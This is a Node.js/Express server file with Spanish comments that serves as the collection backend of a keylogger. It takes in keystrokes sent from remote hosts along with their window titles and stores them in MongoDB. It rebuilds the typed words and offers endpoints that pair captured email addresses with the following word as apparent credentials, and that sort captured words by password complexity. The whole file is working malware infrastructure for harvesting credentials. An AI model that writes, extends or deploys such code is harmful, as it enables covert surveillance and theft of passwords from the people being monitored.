const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const Keystroke = require('./models/Keystroke');
const Word = require('./models/Word');
const Credential = require('./models/Credential');
const wordBuilder = require('./wordBuilder');

const PORT = parseInt(process.env.PORT || '3000', 10);
const MONGO_URI = process.env.MONGO_URI || 'mongodb://127.0.0.1:27017/keylogger';

const app = express();
app.use(express.json({ limit: '32kb' }));
app.use(express.static(path.join(__dirname, 'public')));

function parseLimit(value, fallback = 200, max = 1000) {
  const parsed = Number.parseInt(value ?? String(fallback), 10);
  if (!Number.isFinite(parsed) || parsed <= 0) return fallback;
  return Math.min(parsed, max);
}

function parseTimestamp(value) {
  if (value === undefined || value === null || value === '') return new Date();
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    throw new Error('timestamp inválido');
  }
  return date;
}

// Construye el filtro de fecha a partir de los query params ?from=&to=
// Devuelve { $gte, $lte } (puede estar vacio). Lanza si una fecha es invalida.
function parseDateRange(query) {
  const range = {};
  if (query.from !== undefined && query.from !== '') {
    const d = new Date(query.from);
    if (Number.isNaN(d.getTime())) throw new Error('from inválido');
    range.$gte = d;
  }
  if (query.to !== undefined && query.to !== '') {
    const d = new Date(query.to);
    if (Number.isNaN(d.getTime())) throw new Error('to inválido');
    range.$lte = d;
  }
  return range;
}

// Construye el $match comun para las agregaciones de Word.
function buildWordMatch(query) {
  const match = {};
  if (query.host) match.host = String(query.host);
  if (query.window) match.window = String(query.window);
  const range = parseDateRange(query);
  if (Object.keys(range).length) match.timestamp = range;
  return match;
}

// Recepcion de pulsaciones desde el cliente.
app.post('/api/keystroke', async (req, res) => {
  try {
    const { host, window, key, timestamp } = req.body || {};
    if (typeof key !== 'string' || key === '') {
      return res.status(400).json({ error: 'key requerido' });
    }

    const safeHost = typeof host === 'string' && host.trim() ? host : 'unknown';
    const safeWindow = typeof window === 'string' ? window : '';
    const safeTimestamp = parseTimestamp(timestamp);

    // IMPORTANTE: procesar la tecla de forma SINCRONA antes de cualquier await.
    // handleKey es sincrono, asi se garantiza que las teclas se procesan
    // en el orden exacto en que llegan (espacio separa palabras, etc.).
    wordBuilder.handleKey({
      host: safeHost,
      window: safeWindow,
      key,
      timestamp: safeTimestamp
    });

    const doc = await Keystroke.create({
      host: safeHost,
      window: safeWindow,
      key,
      timestamp: safeTimestamp
    });

    res.status(201).json({ id: doc._id });
  } catch (err) {
    res.status(400).json({ error: err.message || 'timestamp inválido' });
  }
});

// Listado de pulsaciones con filtros simples.
app.get('/api/keystrokes', async (req, res) => {
  const { host, limit } = req.query;
  const q = {};
  if (host) q.host = String(host);
  try {
    const range = parseDateRange(req.query);
    if (Object.keys(range).length) q.timestamp = range;
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }

  const parsedLimit = parseLimit(limit, 200);
  const docs = await Keystroke.find(q)
    .sort({ timestamp: -1 })
    .limit(parsedLimit);
  res.json(docs);
});

// --------- Estadisticas de palabras ---------

// Top palabras mas usadas. ?host=&window=&limit=&from=&to=
app.get('/api/stats/top-words', async (req, res) => {
  let match;
  try { match = buildWordMatch(req.query); }
  catch (err) { return res.status(400).json({ error: err.message }); }

  const limit = parseLimit(req.query.limit, 25, 500);

  try {
    const rows = await Word.aggregate([
      { $match: match },
      { $group: { _id: { $toLower: '$word' }, count: { $sum: 1 } } },
      { $sort: { count: -1, _id: 1 } },
      { $limit: limit },
      { $project: { _id: 0, word: '$_id', count: 1 } }
    ]);
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Resumen general. ?host=&window=&from=&to=
app.get('/api/stats/summary', async (req, res) => {
  let match;
  try { match = buildWordMatch(req.query); }
  catch (err) { return res.status(400).json({ error: err.message }); }

  const base = Object.keys(match).length ? [{ $match: match }] : [];

  try {
    const [totals, perHost, lenHist, uniqueAgg] = await Promise.all([
      Word.aggregate([
        ...base,
        {
          $group: {
            _id: null,
            total: { $sum: 1 },
            avgLen: { $avg: '$length' }
          }
        }
      ]),
      Word.aggregate([
        ...base,
        { $group: { _id: '$host', count: { $sum: 1 } } },
        { $sort: { count: -1 } },
        { $project: { _id: 0, host: '$_id', count: 1 } }
      ]),
      Word.aggregate([
        ...base,
        { $group: { _id: '$length', count: { $sum: 1 } } },
        { $sort: { _id: 1 } },
        { $project: { _id: 0, length: '$_id', count: 1 } }
      ]),
      Word.aggregate([
        ...base,
        { $group: { _id: { $toLower: '$word' } } },
        { $count: 'unique' }
      ])
    ]);

    res.json({
      totalWords: totals[0]?.total || 0,
      uniqueWords: uniqueAgg[0]?.unique || 0,
      averageLength: Math.round((totals[0]?.avgLen || 0) * 100) / 100,
      perHost,
      lengthHistogram: lenHist
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Top ventanas. ?host=&limit=&from=&to=
app.get('/api/stats/top-windows', async (req, res) => {
  let match;
  try { match = buildWordMatch(req.query); }
  catch (err) { return res.status(400).json({ error: err.message }); }

  const limit = parseLimit(req.query.limit, 15, 100);

  try {
    const rows = await Word.aggregate([
      { $match: match },
      { $group: { _id: '$window', count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: limit },
      { $project: { _id: 0, window: '$_id', count: 1 } }
    ]);
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Pulsaciones por hora del dia (0-23). ?host=&from=&to=
// Agrega sobre Keystroke, no sobre Word, para capturar actividad total.
app.get('/api/stats/by-hour', async (req, res) => {
  const match = {};
  if (req.query.host) match.host = String(req.query.host);
  try {
    const range = parseDateRange(req.query);
    if (Object.keys(range).length) match.timestamp = range;
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }

  try {
    const rows = await Keystroke.aggregate([
      ...(Object.keys(match).length ? [{ $match: match }] : []),
      { $group: { _id: { $hour: '$timestamp' }, count: { $sum: 1 } } },
      { $project: { _id: 0, hour: '$_id', count: 1 } },
      { $sort: { hour: 1 } }
    ]);

    // Rellenar huecos 0..23 con count=0 para que la grafica siempre tenga 24 barras.
    const map = new Map(rows.map(r => [r.hour, r.count]));
    const full = [];
    for (let h = 0; h < 24; h++) full.push({ hour: h, count: map.get(h) || 0 });
    res.json(full);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Fuerza el guardado de los buffers de palabras en memoria.
app.post('/api/stats/flush', async (req, res) => {
  try {
    await wordBuilder.flushAll();
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --------- Credenciales detectadas (emails + palabra siguiente) ---------

// Lista de credenciales. ?host=&limit=&from=&to=
app.get('/api/stats/credentials', async (req, res) => {
  const match = {};
  if (req.query.host) match.host = String(req.query.host);
  try {
    const range = parseDateRange(req.query);
    if (Object.keys(range).length) match.timestamp = range;
  } catch (err) {
    return res.status(400).json({ error: err.message });
  }

  const limit = parseLimit(req.query.limit, 50, 500);

  try {
    const docs = await Credential.find(match)
      .sort({ timestamp: -1 })
      .limit(limit)
      .lean();
    res.json(docs);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// --------- Patrones de contraseña ---------

// Palabras clasificadas por complejidad. ?host=&limit=&from=&to=&complexity=
app.get('/api/stats/password-patterns', async (req, res) => {
  let match;
  try { match = buildWordMatch(req.query); }
  catch (err) { return res.status(400).json({ error: err.message }); }

  // Solo palabras con complejidad no nula.
  match.complexity = req.query.complexity
    ? String(req.query.complexity)
    : { $ne: null };

  const limit = parseLimit(req.query.limit, 50, 500);

  try {
    const rows = await Word.aggregate([
      { $match: match },
      { $sort: { timestamp: -1 } },
      { $limit: limit },
      { $project: { _id: 0, word: 1, complexity: 1, host: 1, window: 1, timestamp: 1 } }
    ]);
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Resumen de patrones: cuantas palabras hay de cada complejidad.
app.get('/api/stats/password-summary', async (req, res) => {
  let match;
  try { match = buildWordMatch(req.query); }
  catch (err) { return res.status(400).json({ error: err.message }); }

  match.complexity = { $ne: null };

  try {
    const rows = await Word.aggregate([
      { $match: match },
      { $group: { _id: '$complexity', count: { $sum: 1 } } },
      { $project: { _id: 0, complexity: '$_id', count: 1 } },
      { $sort: { count: -1 } }
    ]);

    const emailCount = await Credential.countDocuments(
      Object.keys(match).length > 1
        ? (() => { const m = { ...match }; delete m.complexity; return m; })()
        : {}
    );

    res.json({ patterns: rows, emailCount });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Salud.
app.get('/api/health', (req, res) => res.json({ ok: true }));

async function main() {
  await mongoose.connect(MONGO_URI);
  console.log('MongoDB conectado:', MONGO_URI);
  app.listen(PORT, () =>
    console.log(`Servidor escuchando en http://127.0.0.1:${PORT}`)
  );
}

// Flush de buffers al apagar el servidor.
async function shutdown() {
  console.log('\nCerrando: volcando buffers de palabras...');
  try { await wordBuilder.flushAll(); } catch (e) { console.error(e.message); }
  try { await mongoose.connection.close(); } catch (e) {}
  process.exit(0);
}
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);

main().catch(err => {
  console.error('Fallo al iniciar:', err);
  process.exit(1);
});
